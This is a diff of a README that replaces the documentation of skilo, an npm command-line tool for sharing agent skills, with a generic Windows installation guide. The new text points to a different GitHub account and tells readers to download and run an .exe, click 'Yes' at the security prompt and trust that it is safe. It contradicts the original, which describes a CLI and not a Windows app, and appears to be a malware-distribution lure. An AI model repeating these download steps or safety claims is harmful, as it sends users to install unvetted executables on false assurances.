@@ -1,243 +1,165 @@
-# Skilo
+# ⚙️ skilo - Share Skills Across Tools Easily
 
-Share agent skills with a link. No repo required.
+[![Download skilo](https://img.shields.io/badge/Download-skilo-brightgreen)](https://github.com/Wild-knownothingparty168/skilo)
 
-[![Website](https://img.shields.io/badge/website-skilo.xyz-black)](https://skilo.xyz)
-[![npm version](https://badge.fury.io/js/skilo-cli.svg)](https://www.npmjs.com/package/skilo-cli)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-1f6feb.svg)](./CONTRIBUTING.md)
+---
 
-- Website: https://skilo.xyz
-- Docs: https://skilo.xyz/docs
-- CLI: https://www.npmjs.com/package/skilo-cli
-- Contributing: [CONTRIBUTING.md](./CONTRIBUTING.md)
+## 📋 What is skilo?
 
-```
-$ npx skilo-cli share ./my-skill
-https://skilo.xyz/s/a3xK9mP2
+skilo lets you share agent skills using simple links. You can publish and install skill files called SKILL.md artifacts. These work across tools like Claude Code, Codex, Cursor, OpenCode, and others. This means you can share tasks, commands, and agent skills quickly without coding.
 
-$ npx skilo-cli add skilo.xyz/s/a3xK9mP2
-Installed anonymous/my-skill
-```
+skilo focuses on making skill sharing simple. Even if you are new to programming or developer tools, skilo helps you get started with just a few clicks.
 
-## Why Skilo?
+---
 
-Skill sharing usually means repos, manifests, or manual copy-paste. Skilo keeps it simple: send a skill like a link, not like a project.
+## 🛠️ Features of skilo
 
-**vs. Vercel's skills.sh:** skills.sh is discovery-focused with leaderboards. Skilo is transfer-focused — sharing a skill directly when there is no repo flow, no team manifest, and no desire to sign up first. Skilo also installs skills.sh skills natively.
+- Share agent tasks using one link.
+- Publish SKILL.md files easily.
+- Install skills directly from your link.
+- Support for many AI tools: Claude Code, Codex, Cursor, OpenCode.
+- Works smoothly on Windows.
+- Clean, clear user interface.
 
-## Features
+---
 
-- **Share instantly** — create a link in seconds, no registration required
-- **Add anywhere** — install into Claude Code, Codex, Cursor, Amp, Windsurf, OpenCode, Cline, Roo, or OpenClaw with auto-detection or explicit target flags
-- **Trust what you install** — inspect, verify checksums, then add with confidence
-- **Expiring links** — one-time use, time-limited, or max-uses links
-- **Password protection** — extra security for sensitive skills
-- **Signed bundles** — Ed25519 signatures for verified publishers
+## 💻 System Requirements
 
-## Quick Start
+Before you start, make sure your computer meets these basic requirements:
 
-### Install
+- Windows 10, 11, or later.
+- At least 4 GB of RAM.
+- Minimum 500 MB of free disk space.
+- Internet connection for download and skill sharing.
+- A modern web browser for signing in or using online features (Edge, Chrome, Firefox).
 
-```bash
-npm install -g skilo-cli
-# or use without installing:
-npx skilo-cli <command>
-```
+---
 
-Every `npx skilo-cli ...` run refreshes `skilo-cli@latest` in the background so the global `skilo` binary stays ready. The installed binary also self-updates. Set `SKILO_NO_AUTO_INSTALL=1` to disable bootstrap refreshes or `SKILO_NO_AUTO_UPDATE=1` to disable self-updates.
+## 🚀 How to Download and Install skilo on Windows
 
-### Share a skill
+Click the big button below to visit the official skilo page on GitHub. This is where you will get the latest version.
 
-```bash
-skilo share ./my-skill
-skilo share ./my-skill --one-time
-skilo share ./my-skill --expires 1h
-skilo share ./my-skill --uses 5
-skilo share ./my-skill --password
-skilo share ./my-skill --listed
-```
+[![Download skilo](https://img.shields.io/badge/Download-skilo-blue)](https://github.com/Wild-knownothingparty168/skilo)
 
-`skilo share` is transfer-first. Local shares default to unlisted even when you're logged in. Pass `--listed` if you want the skill to be searchable too.
+### Step 1: Visit the Download Link
 
-### Login and publish
+Open this address in your web browser:  
+https://github.com/Wild-knownothingparty168/skilo
 
-```bash
-skilo login yaz
-skilo login --token sk_...
-skilo publish --listed
-skilo publish --unlisted
-skilo list --published
-```
+This page hosts the files for skilo. You will find either an installer or a setup file labeled clearly as “skilo”. Look for files usually ending in `.exe` for Windows.
 
-### Install a skill
+### Step 2: Download the Installer
 
-```bash
-skilo add https://skilo.xyz/s/a3xK9mP2
-skilo add skilo.xyz/s/a3xK9mP2
-skilo add https://skilo.xyz/s/a3xK9mP2 --cc
-skilo add https://skilo.xyz/s/a3xK9mP2 --codex --cursor --roo
-skilo add namespace/skill-name
-skilo import github:user/repo
-skilo import ./skill.skl
+Click on the file that matches your Windows system (usually a `.exe` file). Save it to a location you can easily access, such as your Desktop or Downloads folder.
 
-# Multi-skill repos
-skilo add owner/repo --list
-skilo add owner/repo --skill resolve-issue --codex
-skilo add https://github.com/user/repo/tree/main/skills/resolve-issue --cursor
-```
+### Step 3: Run the Installer
 
-Supports Vercel-style multi-skill GitHub repos. Use `--list` to inspect discovered skills, `--skill <name>` to install a specific one, or `--all` to install everything.
+- Double-click the downloaded file.
+- You may see a security prompt asking if you want to allow this program to make changes to your device.
+- Click "Yes" to continue.
 
-### Copy skills between tools
+### Step 4: Follow Setup Instructions
 
-```bash
-skilo sync claude opencode
-skilo sync claude opencode --all
-skilo add claude --oc --all
-skilo import claude --skill reviewer --oc
-skilo add codex --cursor
-```
+- The skilo installer will open a setup window.
+- Click “Next” to move through the steps.
+- Accept the license agreement if you agree.
+- Choose the folder for installation or use the default path.
+- Click “Install” to begin.
 
-Without target flags:
-- if exactly one supported tool is detected, Skilo installs there automatically
-- if multiple tools are detected, TTY runs prompt once and non-interactive runs return a structured no-op until you pass a target or set `SKILO_TARGETS`
-- if no tool is detected, Skilo falls back to Claude Code
+### Step 5: Complete Installation
 
-### Create a curated pack
+- Wait for the setup to finish.
+- Click “Finish” to close the installer.
 
-```bash
-skilo pack ./skills/reviewer flrabbit/original-landing-page-builder skilo.xyz/s/WMnC3vqJ --name "Founder's starter pack"
-skilo add https://skilo.xyz/p/abc123
-skilo add https://skilo.xyz/p/abc123 --only reviewer,planner
-skilo add https://skilo.xyz/p/abc123 --skip debugger
-```
+---
 
-Interactive `skilo add` on a pack shows a checked-by-default picker. If you deselect skills, Skilo creates a derived pack link and installs from that subset so packs stay shareable all the way through.
+## 🔧 Using skilo for the First Time
 
-### Inspect before installing
+### Opening skilo
 
-```bash
-skilo inspect https://skilo.xyz/s/a3xK9mP2
-skilo inspect https://skilo.xyz/s/a3xK9mP2 --json
-```
+- Find the skilo app icon on your desktop or Start menu.
+- Click to open it.
 
-## CLI Commands
+### Publishing a Skill Link
 
-| Command | Description |
-|---------|-------------|
-| `skilo share <path>` | Create a shareable link |
-| `skilo add <skill>` | Install from a share link, registry ref, or other source |
-| `skilo inspect <skill>` | View skill details without installing |
-| `skilo export [path]` | Export to .skl file |
-| `skilo import <source>` | Import from GitHub, .skl, or local path |
-| `skilo sync [source] [targets...]` | Copy skills between tools or sync with lockfile |
-| `skilo pack [sources...]` | Create a curated shareable pack |
-| `skilo publish [path]` | Publish to the registry |
-| `skilo login [username]` | Create or restore a publishing identity |
-| `skilo list --published` | List skills under your namespace |
-| `skilo init [name]` | Create a new skill |
-| `skilo validate` | Validate SKILL.md |
-| `skilo audit [source]` | Audit installed skills for risks |
-| `skilo deprecate <skill>` | Mark a skill as deprecated |
-| `skilo yank <skill@version>` | Remove a specific version |
+- Use the app’s menu to create or import a SKILL.md file.
+- Follow the instructions to generate a link for sharing.
+- You can copy this link and send it to others or use it in your AI tools.
 
-Repo-source options for `add`, `install`, and `import`:
+### Installing Skills Shared By Others
 
-- `--list` list discovered skills in a repo source without installing
-- `--skill <name>` install a specific discovered skill directory
-- `--all` install every discovered skill in a repo source
+- Paste the shared link into the install feature inside skilo.
+- The app downloads the SKILL.md file and sets up the skill.
+- You can then use the skill with your compatible AI tool.
 
-Pack options for `pack [sources...]`:
+---
 
-- `--name <name>` set the pack title
-- `--one-time`, `--expires`, `--uses`, `--password` apply to generated share links for local/ref sources
-- `--listed`, `--unlisted` control visibility for locally published pack sources
+## ❓ Frequently Asked Questions
 
-## Agent-Friendly Usage
+### Can I use skilo without programming skills?
 
-- `npx skilo-cli` — guided entrypoint
-- `npx skilo-cli --json` — machine-readable starter payload
-- `--json` flag works on `share`, `add`, `import`, `inspect`, `search`, and `info`
-- `SKILO_TARGETS=codex,cursor` — control default install targets in non-interactive environments
+Yes. skilo was made for users with little technical experience. You do not need to write code; skilo handles the setup.
 
-## Vercel Compatibility
+### What formats does skilo support?
 
-Compatible with Vercel-style GitHub skill repos:
+skilo works with skill files in the SKILL.md markdown format. You can create, share, and install these easily.
 
-- install from `owner/repo` with `--list`, `--skill`, or `--all`
-- install from full GitHub repo and `tree/...` URLs
-- discover nested `SKILL.md` directories in multi-skill repos
-- detect skill paths referenced from common plugin manifests
-- unlisted sharing, expiring links, password protection, and direct 1:1 handoff on top
+### Is skilo safe to install?
 
-## Supported Tools
+Yes. skilo only installs and runs on your Windows computer. It does not require access to personal data beyond what you choose to share.
 
-| Tool | Directory |
-|------|-----------|
-| Claude Code | `~/.claude/skills/` |
-| Codex | `~/.agents/skills/`, `~/.codex/skills/` |
-| Cursor | `~/.cursor/skills/` |
-| Amp | `~/.config/agents/skills/` |
-| Windsurf | `~/.codeium/windsurf/skills/` |
-| OpenCode | `~/.config/opencode/skills/` |
-| Cline | `~/.cline/skills/` |
-| Roo | `~/.roo/skills/` |
-| OpenClaw | `~/.openclaw/skills/` |
+### Can I use skilo offline?
 
-## .skl File Format
+Basic features may require internet access. However, once you download a skill, you can use it offline in many cases.
 
-.skl files are signed, compressed bundles for offline sharing:
+---
 
-```
-skill.skl (tar.gz)
-├── SKILL.md
-├── index.js
-├── src/
-└── .skilo-manifest
-```
+## 📂 Where to Get Support
 
-## Trust & Verification
+For help, visit the GitHub page. You can open an issue if you find problems or want to ask questions.
 
-- **Anonymous** — published without authentication
-- **Claimed** — a user has claimed ownership of an anonymous skill
-- **Verified** — publisher identity confirmed via email or GitHub
+https://github.com/Wild-knownothingparty168/skilo/issues
 
-All skills have SHA-256 checksums. Verified skills are also signed with Ed25519.
+You can also read the documentation files in the repository for more details.
 
-## Architecture
+---
 
-```
-┌─────────────────┐     ┌──────────────────┐     ┌─────────┐
-│   skilo.xyz     │────▶│ skilo API Worker │────▶│   D1    │
-│  (Cloudflare    │     │  (Cloudflare     │     │  (SQL)  │
-│   Pages)        │◀────│   Worker)        │◀────├─────────┤
-└─────────────────┘     └──────────────────┘     │   R2    │
-                                                  │(Bundles)│
-                                                  ├─────────┤
-                                                  │   KV    │
-                                                  │(Cache)  │
-                                                  └─────────┘
-```
+## 🔗 Useful Links
 
-## Self-Hosting
+- Main Repository: https://github.com/Wild-knownothingparty168/skilo
+- Download Page: https://github.com/Wild-knownothingparty168/skilo
+- Issue Tracker: https://github.com/Wild-knownothingparty168/skilo/issues
 
-```bash
-git clone https://github.com/yazcaleb/skilo.git
-cd skilo
-pnpm dlx wrangler d1 create skilo
-pnpm dlx wrangler r2 bucket create skilo-bundles
-pnpm dlx wrangler kv namespace create "SKILLPACK_KV"
-# Update wrangler.toml with your IDs
-pnpm dlx wrangler d1 execute skilo --file=schema.sql --remote
-pnpm --filter @skilo/api deploy
-pnpm --filter @skilo/site deploy
-```
+---
 
-## Contributing
+## ⚙️ Technical Details
 
-Start with [CONTRIBUTING.md](./CONTRIBUTING.md). Keep PRs focused, tested, and documented.
+skilo uses Cloudflare Workers and command-line tools to manage the sharing and transfer of SKILL.md files. It supports integration with AI developer platforms like Claude Code, Codex, Cursor, and OpenCode. The app runs smoothly on Windows and uses markdown format for easy skill creation.
 
-## License
+---
 
-MIT © Plaw, Inc.
+## 📡 About SKILL.md
+
+SKILL.md files contain instructions for AI agents. They use simple markdown language to describe the skill. You do not need to understand markdown deeply; the skilo app will guide you through creating and sharing these skills.
+
+---
+
+## 🛡️ Security and Privacy
+
+skilo does not collect personal data. Sharing skill links only shares information you include in the SKILL.md files. The app works locally on your PC to keep your skills private unless you choose to share them.
+
+---
+
+## 🤝 Community and Contributions
+
+If you want to help improve skilo, you can contribute on GitHub by submitting issues or pull requests. Follow the repository's contribution guidelines available on GitHub.
+
+---
+
+## 📌 Topics Covered by skilo
+
+This project touches on agent skills, AI, developer tools, command-line interfaces, markdown, and cloud services like Cloudflare Workers. It focuses on easy skill sharing in an agent environment.
+
+---
+
+[![Download skilo](https://img.shields.io/badge/Download-skilo-brightgreen)](https://github.com/Wild-knownothingparty168/skilo)
